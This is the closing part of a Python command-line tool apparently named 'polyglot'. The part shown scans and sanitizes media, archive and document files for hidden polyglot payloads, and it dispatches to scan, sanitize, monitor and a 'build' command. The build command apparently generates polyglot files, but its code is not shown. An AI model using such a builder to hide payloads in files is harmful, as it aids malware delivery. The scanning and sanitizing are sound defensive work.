                '.zip','.exe','.dll','.bat','.cmd','.ps1','.vbs','.js','.mp4'}
        files = []
        for root, dirs, fnames in os.walk(target):
            dirs[:] = [d for d in dirs if not d.startswith('.')]
            for f in fnames:
                if os.path.splitext(f)[1].lower() in exts:
                    files.append(os.path.join(root, f))
    else:
        print(f"Not found: {target}", file=sys.stderr)
        sys.exit(1)

    threats = 0
    for fpath in files:
        fname = os.path.basename(fpath)
        try:
            findings = d.scan_file(fpath)
            crit = [f for f in findings if f['severity'] in ('critical','high')]
            if crit:
                threats += len(crit)
                if HAS_RICH:
                    console.print(f"[bold red]⚠ {fname}[/bold red]")
                    for f in findings:
                        console.print(f"  [{f['severity']}] {f['type']}: {f['detail']}")
                else:
                    print(f"⚠ {fname}")
                    for f in findings:
                        print(f"  [{f['severity']}] {f['type']}: {f['detail']}")
            else:
                if HAS_RICH:
                    console.print(f"[green]✓ {fname}[/green]")
                else:
                    print(f"✓ {fname}")
        except Exception as e:
            print(f"✗ {fname} — error: {e}")

    if HAS_RICH:
        console.print(f"\n[bold]{'THREATS: '+str(threats) if threats else 'ALL CLEAN'}[/bold] — {len(files)} files")
    else:
        print(f"\n{'THREATS: '+str(threats) if threats else 'ALL CLEAN'} — {len(files)} files")


def cli_sanitize(args):
    """polyglot sanitize <file_or_dir> [--no-backup] [--dry-run]"""
    if not args:
        print("Usage: polyglot sanitize <file_or_dir> [--no-backup] [--dry-run]", file=sys.stderr)
        return

    target = args[0]
    backup = "--no-backup" not in args
    dry_run = "--dry-run" in args
    s = PolyglotSanitizer()

    if os.path.isfile(target):
        files = [target]
    elif os.path.isdir(target):
        exts = {'.jpg','.jpeg','.png','.gif','.bmp','.pdf','.zip','.mp4'}
        files = []
        for root, dirs, fnames in os.walk(target):
            dirs[:] = [d for d in dirs if not d.startswith('.')]
            for f in fnames:
                if os.path.splitext(f)[1].lower() in exts:
                    files.append(os.path.join(root, f))
    else:
        print(f"Not found: {target}", file=sys.stderr)
        sys.exit(1)

    if dry_run:
        print("  [DRY-RUN MODE — no files will be modified]\n")

    for fpath in files:
        fname = os.path.basename(fpath)
        prefix = "[DRY-RUN] " if dry_run else ""
        try:
            result = s.sanitize(fpath, backup and not dry_run)
            if result.get('safe_metadata'):
                print(f"{prefix}○ {fname} — {result['detail']} (safe)")
            elif result['status'] == 'sanitized':
                print(f"{prefix}✓ {fname} — {result['detail']}")
            else:
                print(f"{prefix}○ {fname} — {result['detail']}")
        except Exception as e:
            print(f"{prefix}✗ {fname} — error: {e}")


# ── Entry Point ──────────────────────────────────────────────

def main():
    args = sys.argv[1:]

    if not args:
        # No args → interactive TUI
        tui = PolyglotTUI()
        tui.main_menu()
    elif args[0] == "tui":
        tui = PolyglotTUI()
        tui.main_menu()
    elif args[0] == "build":
        cli_build(args[1:])
    elif args[0] == "scan":
        cli_scan(args[1:])
    elif args[0] == "sanitize":
        cli_sanitize(args[1:])
    elif args[0] == "monitor":
        tui = PolyglotTUI()
        tui.menu_monitor()
    elif args[0] in ("help", "--help", "-h"):
        print(__doc__)
    else:
        print(f"Unknown command: {args[0]}", file=sys.stderr)
        print("Commands: tui, build, scan, sanitize, monitor, help", file=sys.stderr)
        sys.exit(1)


if __name__ == '__main__':
    main()
